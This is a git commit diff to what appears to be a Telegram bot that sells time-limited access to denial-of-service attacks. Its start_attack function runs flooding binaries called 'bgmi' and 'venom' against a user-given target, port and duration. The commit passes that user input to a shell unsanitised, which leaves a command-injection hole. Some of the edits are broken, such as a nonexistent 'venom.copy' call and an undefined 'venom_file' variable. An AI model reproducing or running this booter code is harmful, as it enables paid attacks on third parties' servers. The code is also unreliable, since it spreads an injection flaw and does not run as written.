1a4219763a924df5ab546f113b387794934be316
BgmiFiles809 <178407188+BgmiFiles809@users.noreply.github.com>
2024-08-30 04:28:35 -0700

    Add files via upload

--- main.py
+++ main.py
@@ -152,8 +152,8 @@ def add_user(message):
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
                 user_venom_path = f'venom{user_id}'
-                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                venom.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                venom.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -256,16 +256,16 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    bgmi2_file = f"venom{user_id}"
+    sahil_file = f"venom{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
-    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸  𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
+    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
     bot.send_message(user_id, response)
     try:
-        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200")
+        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
-        full_command = f"./{bgmi2_file} {target} {port} {duration} 200"
+        subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
